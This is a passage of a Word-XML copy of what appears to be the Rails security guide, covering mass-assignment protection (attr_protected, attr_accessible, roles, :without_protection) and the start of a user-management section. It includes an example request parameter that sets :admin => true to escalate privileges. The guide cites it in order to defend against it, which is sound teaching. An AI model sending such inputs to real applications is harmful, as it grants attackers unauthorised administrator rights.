          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="572F9F78" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1390112626"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>attr_protected :admin</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="48AF953C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>attr_protected</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> also optionally takes a role option using :as which allows you to define multiple mass-assignment groupings. If no role is defined then attributes will be added to the :default role.</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4848"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0E541175" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="12FCFBC9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1087074846"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>attr_protected :last_login, :as</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :admin</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4A2E7B43" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A much better way, because it follows the whitelist-principle, is the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>attr_accessible</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method. It is the exact opposite of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>attr_protected</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, because </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>it takes a list of attributes that will be accessible</w:t>
      </w:r>
      <w:r>
        <w:t>. All other attributes will be protected. This way you won’t forget to protect attributes when adding new ones in the course of development. Here is an example:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5568"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="7AB6D20D" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="743B974C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>attr_accessible :name</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2D283645" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>attr_accessible :name, :is_admin, :as</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :admin</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="52A52685" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>If you want to set a protected attribute, you will to have to assign it individually:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6480"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="43142B5A" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="24C3A871" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>params[:user] # =&gt; {:name =&gt; "ow3ned", :admin =&gt; true}</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0121AEA7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@user</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= User.new(params[:user])</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0435E79B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@user.admin # =&gt; false # not mass-assigned</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2302DBDC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@user.admin = true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3FB94EE3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@user.admin # =&gt; true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="77CFE56C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">When assigning attributes in Active Record using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>attributes=</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the :default role will be used. To assign attributes using different roles you should use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>assign_attributes</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> which accepts an optional :as options parameter. If no :as option is provided then the :default role will be used. You can also bypass mass-assignment security by using the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:without_protection</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> option. Here is an example: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D413C86" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7DA1563E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@user</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= User.new</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="31768C06" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2BE693A1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@user.assign_attributes({ :name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'Josh', :is_admin</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>})</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="47BA4BF9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@user.name # =&gt; Josh</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="51016A0B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@user.is_admin # =&gt; false</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3E4E18FD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="55217874" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@user.assign_attributes({ :name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'Josh', :is_admin</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>}, :as</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :admin)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0016CC1E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@user.name # =&gt; Josh</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="05A14370" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@user.is_admin # =&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="16A4DD6F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4DCF9FDE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@user.assign_attributes({ :name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'Josh', :is_admin</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>}, :without_protection</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3134E64E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@user.name # =&gt; Josh</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5573F9C1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@user.is_admin # =&gt; true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="2ABBD199" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In a similar way, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>new</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>create</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>create!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>update_attributes</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">, and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>update_attributes!</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> methods all respect mass-assignment security and accept either </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:as</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>:without_protection</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> options. For example: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002C152" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0264AA29" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@user</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= User.new({ :name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'Sebastian', :is_admin</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>}, :as</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; :admin)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6AE0969F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@user.name # =&gt; Sebastian</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="44FF46A7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@user.is_admin # =&gt; true</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="10464D03" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7405257B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@user</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= User.create({ :name</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; 'Sebastian', :is_admin</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>}, :without_protection</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>=&gt; true)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="047BE523" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@user.name # =&gt; Sebastian</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="20121029" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@user.is_admin # =&gt; true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="34BF4B1E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>A more paranoid technique to protect your whole project would be to enforce that all models define their accessible attributes. This can be easily achieved with a very simple application config option of:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5760"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="1E58F0DA" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="29B1A022" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="863134926"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>config.active_record.whitelist_attributes = true</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="551C8D06" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This will create an empty whitelist of attributes available for mass-assignment for all models in your app. As such, your models will need to explicitly whitelist or blacklist accessible parameters by using an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>attr_accessible</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>attr_protected</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> declaration. This technique is best applied at the start of a new project. However, for an existing project with a thorough set of functional tests, it should be straightforward and relatively quick to use this application config option; run your tests, and expose each attribute (via </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>attr_accessible</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>attr_protected</w:t>
      </w:r>
      <w:r>
        <w:t>) as dictated by your failing tests.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="435AF100" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>7 User Management</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12DC7454" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">— </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>Almost every web application has to deal with authorization and authentication. Instead of rolling your own, it is advisable to use common plug-ins. But keep them up-to-date, too. A few additional precautions can make your application even more secure.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E678080" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">There are a number of authentication plug-ins for Rails available. Good ones, such as the popular </w:t>
      </w:r>
      <w:hyperlink r:id="rId706" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>devise</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:hyperlink r:id="rId707" w:history="1">
        <w:r>
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>authlogic</w:t>
        </w:r>
      </w:hyperlink>
      <w:r>
        <w:t xml:space="preserve">, store only encrypted passwords, not plain-text passwords. In Rails 3.1 you can use the built-in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>has_secure_password</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> method which has similar features.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53B97B00" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Every new user gets an activation code to activate his account when he gets an e-mail with a link in it. After activating the account, the activation_code columns will be set to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>NULL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in the database. If someone requested an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>URL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> like these, he would be logged in as the first activated user found in the database (and chances are that this is the administrator):</w:t>
      </w:r>
    </w:p>
    <w:tbl>
